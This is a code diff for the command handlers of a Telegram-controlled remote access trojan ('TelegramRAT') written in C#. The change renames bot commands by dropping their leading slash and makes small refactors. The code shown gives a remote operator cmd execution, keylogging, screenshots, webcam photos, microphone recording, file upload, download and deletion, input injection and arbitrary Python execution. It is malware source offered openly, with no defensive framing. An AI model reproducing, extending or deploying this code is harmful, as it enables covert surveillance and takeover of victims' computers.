@@ -123,7 +123,7 @@ namespace TelegramRAT
 
                 string messageText = update.Message.Type == MessageType.Text ? update.Message.Text : update.Message.Caption;
 
-                var model = BotCommandModel.FromMessage(update.Message);
+                var model = BotCommandModel.FromMessage(update.Message, string.Empty);
 
                 if (model == null)
                     continue;
@@ -192,12 +192,12 @@ namespace TelegramRAT
             //HELP
             CommandsList.Add(new BotCommand
             {
-                Command = "/help",
+                Command = "help",
                 IgnoreCountArgs = true,
                 MayHaveNoArgs = true,
 
                 Description = "Show description of other commands.",
-                Example = "/help screenshot",
+                Example = "<code>/help screenshot</code>",
 
                 Execute = model =>
                 {
@@ -210,10 +210,7 @@ namespace TelegramRAT
                             return;
                         }
                         string command = model.Args[0];
-                        if (!command.StartsWith("/"))
-                        {
-                            command = "/" + command;
-                        }
+                        
                         var cmd = commands.Find(cmd => cmd.Command == command);
                         if (cmd == null)
                         {
@@ -243,7 +240,7 @@ namespace TelegramRAT
             //CMD
             CommandsList.Add(new BotCommand
             {
-                Command = "/cmd",
+                Command = "cmd",
                 IgnoreCountArgs = true,
                 Description = "Run cmd commands.",
                 Example = "/cmd dir",
@@ -289,7 +286,7 @@ namespace TelegramRAT
             //DIR
             CommandsList.Add(new BotCommand
             {
-                Command = "/dir",
+                Command = "dir",
                 CountArgs = 0,
                 IgnoreCountArgs = true,
                 MayHaveNoArgs = true,
@@ -364,7 +361,7 @@ namespace TelegramRAT
             //PROCESSESLIST
             CommandsList.Add(new BotCommand
             {
-                Command = "/processes",
+                Command = "processes",
                 CountArgs = 0,
                 Description = "Get list of running processes.",
                 Example = "/processes",
@@ -401,7 +398,7 @@ namespace TelegramRAT
             //PROCESS
             CommandsList.Add(new BotCommand
             {
-                Command = "/process",
+                Command = "process",
                 CountArgs = 1,
 
                 Description = "Show info about process by its id.",
@@ -436,7 +433,7 @@ namespace TelegramRAT
             //PROCESSKILL
             CommandsList.Add(new BotCommand
             {
-                Command = "/processkill",
+                Command = "processkill",
                 IgnoreCountArgs = true,
                 MayHaveNoArgs = false,
 
@@ -507,7 +504,7 @@ namespace TelegramRAT
             //CD
             CommandsList.Add(new BotCommand
             {
-                Command = "/cd",
+                Command = "cd",
                 IgnoreCountArgs = true,
 
                 Description = "Change current directory.",
@@ -532,7 +529,7 @@ namespace TelegramRAT
             //CURDIR
             CommandsList.Add(new BotCommand
             {
-                Command = "/curdir",
+                Command = "curdir",
                 CountArgs = 0,
 
                 Description = "Show current directory.",
@@ -553,7 +550,7 @@ namespace TelegramRAT
             //POWER MEGA COMMAND
             CommandsList.Add(new BotCommand
             {
-                Command = "/power",
+                Command = "power",
                 CountArgs = 1,
                 Description = "Switch PC power state. Usage:\n\n" +
                 "Off - Turn PC off\n" +
@@ -609,7 +606,7 @@ namespace TelegramRAT
             //DOWNLOAD
             CommandsList.Add(new BotCommand
             {
-                Command = "/download",
+                Command = "download",
                 IgnoreCountArgs = true,
                 MayHaveNoArgs = false,
 
@@ -640,7 +637,7 @@ namespace TelegramRAT
             //SCREENSHOT
             CommandsList.Add(new BotCommand
             {
-                Command = "/screenshot",
+                Command = "screenshot",
                 CountArgs = 0,
                 Description = "Take a screenshot of all displays area.",
                 Example = "/screenshot",
@@ -677,7 +674,7 @@ namespace TelegramRAT
             //GET USER TELEGRAM ID
             CommandsList.Add(new BotCommand
             {
-                Command = "/getid",
+                Command = "getid",
                 CountArgs = 0,
 
                 Description = "Get chat or user id. To get user's id type this command as answer to user message. Made in developing purposes.",
@@ -696,7 +693,7 @@ namespace TelegramRAT
             //TAKE PHOTO FROM WEBCAM
             CommandsList.Add(new BotCommand
             {
-                Command = "/webcam",
+                Command = "webcam",
                 CountArgs = 0,
 
                 Description = "Take a photo from webcamera.",
@@ -750,7 +747,7 @@ namespace TelegramRAT
             //MESSAGEBOX
             CommandsList.Add(new BotCommand
             {
-                Command = "/message",
+                Command = "message",
                 IgnoreCountArgs = true,
                 Description = "Send message with dialog window.",
                 Example = "message Lorem ipsum",
@@ -758,7 +755,7 @@ namespace TelegramRAT
                 {
                     Task.Run(() =>
                     {
-                        WinAPI.ShowMessageBox(model.RawArgs, "Message", WinAPI.MsgBoxFlag.MB_APPLMODAL);
+                        WinAPI.ShowMessageBox(model.RawArgs, "Message", WinAPI.MsgBoxFlag.MB_APPLMODAL | WinAPI.MsgBoxFlag.MB_ICONINFORMATION);
                     });
                 }
 
@@ -767,7 +764,7 @@ namespace TelegramRAT
             //OPENURL
             CommandsList.Add(new BotCommand
             {
-                Command = "/openurl",
+                Command = "openurl",
                 IgnoreCountArgs = true,
 
                 Description = "Open URL with default browser.",
@@ -794,7 +791,7 @@ namespace TelegramRAT
             //UPLOAD FILE TO PC
             CommandsList.Add(new BotCommand
             {
-                Command = "/upload",
+                Command = "upload",
                 IgnoreCountArgs = true,
                 MayHaveNoArgs = true,
 
@@ -858,7 +855,7 @@ namespace TelegramRAT
             //SEND KEYBOARD INPUT 
             CommandsList.Add(new BotCommand
             {
-                Command = "/sendinput",
+                Command = "sendinput",
                 IgnoreCountArgs = true,
                 MayHaveNoArgs = false,
                 Description =
@@ -913,7 +910,7 @@ namespace TelegramRAT
             //WALLPAPER
             CommandsList.Add(new BotCommand
             {
-                Command = "/wallpaper",
+                Command = "wallpaper",
                 Description = "Change wallpapers. Don't foreget to attach the image.",
                 Execute = model =>
                 {
@@ -974,7 +971,7 @@ namespace TelegramRAT
             //WINDOW MEGA COMMAND
             CommandsList.Add(new BotCommand
             {
-                Command = "/window",
+                Command = "window",
                 MayHaveNoArgs = false,
                 IgnoreCountArgs = true,
                 Description = "This command has multiple usage. After usage type title or pointer(type 0x at the start) of window. Usage list:\n\n" +
@@ -1080,7 +1077,7 @@ namespace TelegramRAT
             //MOVE MOUSE TO COORD
             CommandsList.Add(new BotCommand
             {
-                Command = "/mouseto",
+                Command = "mouseto",
                 CountArgs = 2,
                 IgnoreCountArgs = false,
                 MayHaveNoArgs = false,
@@ -1109,7 +1106,7 @@ namespace TelegramRAT
             //MOVE MOUSE BY PIXELS
             CommandsList.Add(new BotCommand
             {
-                Command = "/mouseby",
+                Command = "mouseby",
                 CountArgs = 2,
                 IgnoreCountArgs = false,
                 MayHaveNoArgs = false,
@@ -1134,7 +1131,7 @@ namespace TelegramRAT
             //CLICK LEFT MOUSE BUTTON
             CommandsList.Add(new BotCommand
             {
-                Command = "/lmclick",
+                Command = "lmclick",
                 Description = "Simulate left mouse click.",
                 Execute = model =>
                 {
@@ -1146,7 +1143,7 @@ namespace TelegramRAT
             //DOUBLECLICK LEFT MOUSE BUTTON
             CommandsList.Add(new BotCommand
             {
-                Command = "/dlmclick",
+                Command = "dlmclick",
                 Description = "Simulate double left mouse click.",
                 Execute = model =>
                 {
@@ -1158,7 +1155,7 @@ namespace TelegramRAT
             //CLICK RIGHT MOUSE BUTTON
             CommandsList.Add(new BotCommand
             {
-                Command = "/rmclick",
+                Command = "rmclick",
                 Description = "Simulate right mouse click.",
                 Execute = model =>
                 {
@@ -1170,7 +1167,7 @@ namespace TelegramRAT
             //SEND TEXT INPUT
             CommandsList.Add(new BotCommand
             {
-                Command = "/sendtext",
+                Command = "sendtext",
                 IgnoreCountArgs = true,
                 MayHaveNoArgs = false,
                 Description = "Send text input",
@@ -1195,7 +1192,7 @@ namespace TelegramRAT
             //KEYLOG
             CommandsList.Add(new BotCommand
             {
-                Command = "/keylog",
+                Command = "keylog",
 
                 Description = "Keylog starts and ends with no args.",
                 Execute = model =>
@@ -1277,7 +1274,7 @@ namespace TelegramRAT
             //RECORD AUDIO
             CommandsList.Add(new BotCommand
             {
-                Command = "/audio",
+                Command = "audio",
                 CountArgs = 1,
                 Description = "Record audio from microphone for given amount of secs.",
                 Example = "/audio 50",
@@ -1343,7 +1340,7 @@ namespace TelegramRAT
             //GET ALL COMMANDS
             CommandsList.Add(new BotCommand
             {
-                Command = "/commands",
+                Command = "commands",
                 Description = "Get all commands list sorted by alphabet",
                 Execute = model =>
                 {
@@ -1352,7 +1349,7 @@ namespace TelegramRAT
                         StringBuilder commandsList = new StringBuilder("List of all commands:\n\n");
                         foreach (BotCommand command in commands.OrderBy(x => x.Command))
                         {
-                            commandsList.AppendLine(command.Command);
+                            commandsList.AppendLine("/" + command.Command);
                         }
                         commandsList.AppendLine("\nHold to copy command");
                         Bot.SendTextMessageAsync(model.Message.Chat.Id, commandsList.ToString(), replyToMessageId: model.Message.MessageId);
@@ -1364,7 +1361,7 @@ namespace TelegramRAT
             //DELETE FILE
             CommandsList.Add(new BotCommand
             {
-                Command = "/deletefile",
+                Command = "deletefile",
                 MayHaveNoArgs = false,
                 Description = "Delete file in path",
                 Example = "/deletefile hello world.txt",
@@ -1395,7 +1392,7 @@ namespace TelegramRAT
             //CREATE FOLDER
             CommandsList.Add(new BotCommand
             {
-                Command = "/createfolder",
+                Command = "createfolder",
                 MayHaveNoArgs = false,
                 Description = "Create folder.",
                 Example = "/createfolder C:\\Users\\User\\Documents\\NewFolder",
@@ -1426,7 +1423,7 @@ namespace TelegramRAT
             //DELETE FOLDER
             CommandsList.Add(new BotCommand
             {
-                Command = "/deletefolder",
+                Command = "deletefolder",
                 MayHaveNoArgs = false,
                 Description = "Delete folder.",
                 Example = "/deletefolder C:\\Users\\User\\Desktop\\My Folder",
@@ -1456,7 +1453,7 @@ namespace TelegramRAT
             //RENAME FILE
             CommandsList.Add(new BotCommand
             {
-                Command = "/renamefile",
+                Command = "renamefile",
                 Description = "Rename file. First argument must be path (full or relative) for file. Second argument must contain only new name.",
                 Example = "/renamefile \"C:\\Users\\User\\Documents\\Old Name.txt\" \"New Name.txt\"",
                 Execute = model =>
@@ -1491,7 +1488,7 @@ namespace TelegramRAT
             //COPY FILE
             CommandsList.Add(new BotCommand
             {
-                Command = "/copyfile",
+                Command = "copyfile",
                 CountArgs = 2,
                 Description = "Copy file. First argument is file path (full or realtive), second is folder path. Type paths as in cmd.",
                 Example = "/copyfile \"My folder\\hello world.txt\" \"C:\\Users\\User\\Documents\\Some Folder\"",
@@ -1524,7 +1521,7 @@ namespace TelegramRAT
             //PYTHON COMMANDS EXECUTING
             CommandsList.Add(new BotCommand
             {
-                Command = "/py",
+                Command = "py",
                 Description = "Execute python expression or file. To execute file attach it to message or send it and reply to it with command /py. Mind that all expressions and files execute in the same script scope. To clear scope /pyclearscope",
                 Example = "/py print('Hello World')",
                 Execute = model =>
@@ -1632,7 +1629,7 @@ namespace TelegramRAT
             //PYTHON CLEAR SCOPE
             CommandsList.Add(new BotCommand
             {
-                Command = "/pyclearscope",
+                Command = "pyclearscope",
                 CountArgs = 0,
                 Description = "Clear python execution scope.",
                 Execute = model =>
@@ -1649,7 +1646,7 @@ namespace TelegramRAT
             //MONITOR OFF/ON
             CommandsList.Add(new BotCommand
             {
-                Command = "/monitor",
+                Command = "monitor",
                 CountArgs = 1,
 
                 Description = "Turn monitor off or on",
@@ -1689,7 +1686,7 @@ namespace TelegramRAT
             //GET LOGICAL DRIVES
             CommandsList.Add(new BotCommand
             {
-                Command = "/drives",
+                Command = "drives",
                 CountArgs = 0,
                 Description = "Show all logical drives on this computer.",
                 Example = "/drives",
@@ -1732,7 +1729,7 @@ namespace TelegramRAT
             //PING 
             CommandsList.Add(new BotCommand
             {
-                Command = "/ping",
+                Command = "ping",
 
                 Description = "Ping bot to check if it's work",
                 Execute = model =>
@@ -1747,7 +1744,7 @@ namespace TelegramRAT
             //REPEAT
             CommandsList.Add(new BotCommand
             {
-                Command = "/repeat",
+                Command = "repeat",
 
                 Description = "Repeat command by replying to a message",
 
@@ -1758,7 +1755,7 @@ namespace TelegramRAT
                         Bot.SendTextMessageAsync(model.Message.Chat.Id, "Reply to message", replyToMessageId: model.Message.MessageId);
                         return;
                     }
-                    BotCommandModel newmodel = BotCommandModel.FromMessage(model.Message.ReplyToMessage);
+                    BotCommandModel newmodel = BotCommandModel.FromMessage(model.Message.ReplyToMessage, string.Empty);
                     
                     if (newmodel == null)
                     {
@@ -1775,11 +1772,6 @@ namespace TelegramRAT
                 }
             });
 
-        }
-
-        public static Message GetMessage(this TelegramBotClient botClient)
-        {
-            return new Message();
         }
 
     }
